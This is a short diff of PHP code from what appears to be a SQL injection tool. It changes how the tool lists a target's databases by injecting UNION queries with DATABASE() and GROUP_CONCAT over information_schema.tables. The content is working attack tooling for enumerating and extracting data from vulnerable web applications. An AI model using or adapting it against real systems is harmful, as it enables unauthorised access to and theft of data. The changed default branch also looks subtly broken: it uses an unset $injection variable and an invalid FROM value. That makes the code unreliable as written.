@@ -177,7 +177,6 @@
 																				"order"				=>	$order,			//variable
 																				"comment"			=>	$comment,		//constant
 																				"callback"			=>	$callback
-	
 											);
 
 											return TRUE;
@@ -320,32 +319,43 @@
 
 				$groupConcatLength	=	$this->getGroupConcatLength();
 
-				$from						=	array();
-				$injection				=	"DISTINCT(TABLE_SCHEMA)";
+				$from						=	"information_schema.tables";
+				$currentDatabase		=	$this->unionQuery("DATABASE()");
+				$currentDatabase		=	$currentDatabase[0];
 
 				switch($this->_config["all"]["wanted-schemas"]){
 
-					case "{all}":
-						$from			=	"information_schema.tables";
+					case "{current}":
+						$databases	=	$currentDatabase;
 						break;
 
-					case "{current}":
-						$injection	=	"DATABASE()";
+					case "{all}":
+
+						$injection	=	"GROUP_CONCAT(DISTINCT(TABLE_SCHEMA))";
+
+						//Here we use group concat in order to see if the injection can be achieved 
+						//with little or no effort
+
+						$databases				=	$this->unionQuery($injection,$from);
+						$databases				=	$databases[0];
+
 						break;
 
 					default:
 
-						$from			=	"information_schema.tables";
+						$from			=	"GROUP_CONCAT(information_schema.tables)";
 						$where		=	array("TABLE_SCHEMA","IN(",$this->_config["all"]["wanted-schemas"].')');
+
+						//Here we use group concat in order to see if the injection can be achieved 
+						//with little or no effort
+
+						$databases				=	$this->unionQuery($injection,$from,$where);
+						$databases				=	$databases[0];
+
 						break;
 
 				}
 
-				//Here we use group concat in order to see if the injection can be achieved 
-				//with little or no effort
-
-				$databases				=	$this->unionQuery("GROUP_CONCAT($injection)",$from,array());
-				$databases				=	$databases[0];
 
 				//However if we detect that the data we fetched is truncated, we are forced 
 				//to perform a few 10ths or 100ths of more queries :(
